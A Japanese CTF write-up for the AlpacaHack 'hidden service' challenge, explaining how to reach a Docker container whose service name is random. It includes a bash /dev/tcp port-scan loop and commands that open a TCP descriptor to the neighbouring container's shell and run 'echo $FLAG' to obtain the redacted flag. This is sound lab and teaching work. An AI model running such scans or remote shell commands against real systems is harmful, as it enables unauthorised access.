# hidden service

https://alpacahack.com/daily/challenges/hidden-service

## 問題の概要

Docker Compose で `socat` で `sh` を起動するコンテナが 2 つ立ち上がっています。

```yaml
services:
  public:
    build: .
    ports: ["${PORT:-1337}:1337"]
    restart: unless-stopped

  ???: # service name is a random string and can't be guessed
    build: .
    environment: ["FLAG=Alpaca{REDACTED}"]
    restart: unless-stopped
```

サーバーにアクセスすると `public` に接続されますが、フラグを持っているのはもう一方のコンテナで、サービス名はランダムな文字列になっています。

## 方針

通常、Docker Compose のネットワークはサービス名をホスト名として名前解決でき、例えば `curl http://app:8080` のようにコンテナ間で通信できるようになっています。

しかし、今回はフラグを持っているコンテナのサービス名がランダムな文字列になっているため、サービス名からアクセスすることができません。

ただし、名前解決ができないだけで、IP アドレスを直接指定すればアクセス可能です。

## 解法

ネットワーク系のコマンド (`ip`, `ifconfig`, `ping`, `nc` など) が入っていないので少し苦労しました。

とりあえず環境変数を確認してみると、`socat` が接続情報を環境変数にセットしているようです。

```bash
$ env
HOSTNAME=a55aae6bd315
SOCAT_PEERADDR=172.18.0.1
HOME=/nonexistent
SOCAT_PEERPORT=40192
SOCAT_SOCKADDR=172.18.0.3
PYTHON_SHA256=d923c51303e38e249136fc1bdf3568d56ecb03214efdef48516176d3d7faaef8
SOCAT_VERSION=1.8.0.3
SOCAT_SOCKPORT=1337
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PYTHON_VERSION=3.14.4
SOCAT_PID=10
PWD=/
SOCAT_PPID=1
```

`SOCAT_SOCKADDR=172.18.0.3` がこのコンテナの IP アドレスで、`SOCAT_PEERADDR=172.18.0.1` が接続元(Docker のホスト側)の IP アドレスのようです。

インターフェースに割り当てられている IP アドレスは `hostname -I` でも確認できます。

```bash
$ hostname -I
172.18.0.3
```

コンテナの起動順次第で前後する可能性がありますが、もう一方のコンテナは `172.18.0.2` だと思われます。

### もう一方のコンテナに接続する

Python が入っているので `socket` モジュールを使えば接続できますが、せっかくなので `bash` だけで接続してみます。

`bash` の機能として、`/dev/tcp/{host}/{port}` という特殊なパスを指定して TCP 接続ができます。
(実際にファイル・デバイスが存在するわけではなく、`bash` がこのパスを特別に解釈して TCP 接続を行います)

例えば `echo hello > /dev/tcp/{host}/{port}` とすれば、指定したホストとポートに TCP 接続して、`hello` を送信することができます。

接続に失敗するとエラーになるので、簡易的なポートスキャンもできます。

```sh
$ bash -c 'for i in {1..10}; do echo -n > /dev/tcp/172.18.0.$i/1337 && echo "172.18.0.$i:1337 is open"; done'
172.18.0.1:1337 is open
172.18.0.2:1337 is open
172.18.0.3:1337 is open
bash: connect: No route to host
bash: line 1: /dev/tcp/172.18.0.4/1337: No route to host
bash: connect: No route to host
bash: line 1: /dev/tcp/172.18.0.5/1337: No route to host
...
```

`exec` を使って FD 番号を割り当てて接続を開くと入出力を同時に行うこともできます。

```sh
$ bash
nobody@a55aae6bd315:/$ exec 3<> /dev/tcp/172.18.0.2/1337
nobody@a55aae6bd315:/$ echo 'echo $FLAG' >&3
nobody@a55aae6bd315:/$ cat <&3
$ Alpaca{REDACTED}
```

この方法でフラグを取得できました。
